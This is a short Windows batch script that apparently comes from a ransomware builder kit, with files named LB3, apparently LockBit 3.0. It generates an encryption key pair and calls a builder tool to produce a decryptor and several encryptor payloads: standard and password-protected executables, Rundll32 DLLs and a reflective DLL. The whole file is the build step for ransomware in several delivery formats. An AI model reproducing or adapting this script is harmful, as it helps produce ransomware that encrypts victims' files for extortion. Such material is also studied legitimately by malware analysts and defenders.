@echo off
mkdir Build
keygen -path Build -pubkey pub.key -privkey priv.key
builder -type dec -privkey Build\priv.key -config config.json -ofile Build\LB3Decryptor.exe
builder -type enc -exe -pubkey Build\pub.key -config config.json -ofile Build\LB3.exe
builder -type enc -exe -pass -pubkey Build\pub.key -config config.json -ofile Build\LB3_pass.exe
builder -type enc -dll -pubkey Build\pub.key -config config.json -ofile Build\LB3_Rundll32.dll
builder -type enc -dll -pass -pubkey Build\pub.key -config config.json -ofile Build\LB3_Rundll32_pass.dll
builder -type enc -ref -pubkey Build\pub.key -config config.json -ofile Build\LB3_ReflectiveDll_DllMain.dll
